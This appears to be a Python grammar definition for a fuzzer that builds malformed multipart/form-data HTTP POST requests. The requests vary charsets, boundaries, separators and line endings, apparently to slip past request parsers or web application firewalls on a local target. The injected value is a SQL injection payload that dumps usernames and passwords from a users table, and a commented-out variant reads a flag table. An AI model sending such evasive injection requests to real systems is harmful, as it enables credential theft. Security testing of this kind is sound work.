TAINT_KEY = "taint"
# TAINT_KEY = "data"
# TAINT = "-1 union select 1,key,3 from flag"
TAINT_VAL  = "1' union select 1,group_concat(user,0x3a,password) from users #"
PATH = "/"
HOST = "localhost:6000"

CHARSET_POOL = ["ascii","utf-7","base64","utf-8","utf-8le","utf-8be","utf-16","quoted-printable"]

grammar = {
    "<start>": [
        ["<request_line>","<request_headers>","<content_length_header>","<content_type_headers>","\r\n\r\n","<body>"]
    ],
    "<request_line>": [
        [f"POST __PATH__ HTTP/1.1\r\n"]
    ],
    "<request_headers>": [
        ["User-Agent: Chrome/104.0.5112.102\r\n",f"HOST: __HOST__\r\n"]
    ],
    "<content_length_header>" :[
        ["Content-Length: __LEN__\r\n"],
    ],
    "<content_type_headers>":[
        (["<content_type_header>"],0.7),
        (["<content_type_header>","<next_line>","<content_type_headers>"],0.1),
        (["<content_type_header>","<next_line>","<content_encoding_header>"],0.1)
        # (["<content_type_header>","<next_line>","<transfer_encoding_header>"],0.1),
    ],
    "<content_type_header>":[
        ["Content-Type:","<blank_token>","<media_type>","<param_seperator>","<blank_token>","<header_params>"],
    ],
    "<content_encoding_header>":[
        ["Content-Encoding:","<blank_token>","<charset_token>"],
    ],
    "<transfer_encoding_header>":[
        ["Transfer-Encoding:","<blank_token>","chunked"],
        ["Transfer-Encoding:","<blank_token>","chunked",",","chunked"],
    ],
    "<media_type>":[
        #(["application/x-www-form-urlencoded"],0.2),
       # ["application/xml"],
       # ["application/json"],
        ["multipart/form-data"],
        #(["multipart/form-data"],0.8),
        #(["text/plain"],0.1)
       # ["multipart/mixed"],
    ],
    "<header_params>":[
        ["<charset_param>","<param_seperator>","<header_params>"],
        ["<boundary_param>","<param_seperator>","<header_params>"],
        #["<media_type>","<param_seperator>","<header_params>"],
        #["<other_param>","<param_seperator>","<header_params>"],
        ["<none>"]
    ],
    r"<(\w+)_param>":[
        [r"<\1_param_key>","=",r"<\1_param_value_field>"],
        #[r"<\1_param_key>","*=",r"<\1_param_value_field>"],
    ],
    r"<(\w+)_param_value_field>":[
        ['"',r'<\1_param_value>','"'],
        ["'",r'<\1_param_value>',"'"],
        #["us-ascii","'","en","'",r"<\1_param_value>"],
        [r'<\1_param_value>'],
    ],
    "<charset_param_key>":[
        ["charset"],
    ],
    "<charset_param_value>":[
        ["<charset_token>"],
    ],
    "<boundary_param_key>":[
        ["boundary"]
    ],
    "<boundary_param_value>":[
        ["<boundary_token>"]
    ],
    "<name_param_key>":[
        ["name"],
    ],
    "<name_param_value>":[
        #["a"],
        ["__TAINTKEY__"],
    ],
    "<taint_param_key>":[
        ["__TAINTKEY__"],
    ],
    "<taint_param_value>":[
        ["<taint_token>"]
    ],
    "<filename_param_key>":[
        ["filename"]
    ],
    "<urlencoded_params>":[
        ["<other_param>"]
    ],
    "<other_param_key>":[
        #["xxx"],
        #["yyy[0]"],
        ["<filename_param_key>"],
    ],
    "<other_param_value>":[
        ["xxx"],
        ["zzzz"],
        ["<media_type>"]
    ],
    "<body>":[
        #["<urlencoded_body>"],
        # ["<json_body>"],
        # ["<xml_body>"],
        ["<multipart_body>"]
    ],
    # https://www.rfc-editor.org/rfc/rfc1867
    # https://www.ietf.org/rfc/rfc2388.txt
    # https://www.rfc-editor.org/rfc/rfc7578
    "<urlencoded_body>":[
        ["<taint_param>","<param_seperator>","<urlencoded_params>"]
    ],
    "<multipart_body>":[
        ["<multipart>","<multiparts>","<boundary_end_line>"]
    ],
    "<multipart>":[
        ["<boundary_seperator_line>","<content_disposition_header>","<next_line>","<headers>","<next_line>","<multipart_value>","<next_line>"],
    ],
    "<multiparts>":[
        (["<none>"],0.8),
        (["<multipart>","<multiparts>"],0.2)
    ],
    "<multipart_value>":[
        (["<taint_token>"],0.9),
        (["<none>"],0.02),
        (["<multipart>"],0.08),
    ],
    "<boundary_seperator_line>":[
        ["--","<boundary_token>","<next_line>"],
    ],
    "<boundary_end_line>":[
        ["--","<boundary_token>","--","<next_line>"],
    ],
    "<content_disposition_header>":[
        ["Content-Disposition:","<blank_token>","<form_data_token>","<param_seperator>","<name_param>","<param_seperator>","<other_param>"],
    ],
    "<content_transfer_encoding_header>":[
        ["Content-Transfer-Encoding:","<blank_token>","<charset_token>"]
    ],
    "<headers>":[
        (["<content_disposition_header>","<next_line>","<headers>"],0.1),
        (["<content_transfer_encoding_header>","<next_line>","<headers>"],0.2),
        (["<content_type_header>","<next_line>","<headers>"],0.1),
        (["<none>"],0.6)
    ],
    "<param_seperator>":[
        ([";"],0.6),
        (["&"],0.3),
        (["<blank_token>"],0.1),
    ],
    "<next_line>":[
        (["\r\n"],0.9),
        (["\n"],0.05),
        (["\r"],0.05),
    ],
    "<form_data_token>":[
        (["form-data"],0.8),
        (["xxx"],0.2),
    ],
    "<none>":[
        [""]
    ],
    "<boundary_token>":[
        (["boundary"],0.8),
        #(["boun dary"],0.1),
        ([""],0.1)
    ],
    "<charset_token>":[
        ["__CHAR__"]
    ],
    "<blank_token>":[
        ([" "],0.8),
        (["\t",0.1]),
        ([" "],0.1)
    ],
    "<taint_token>":[
        (["__TAINTVAL__"],0.9),
        (["__DUMBTAINTVAL__"],0.1)
    ],
}
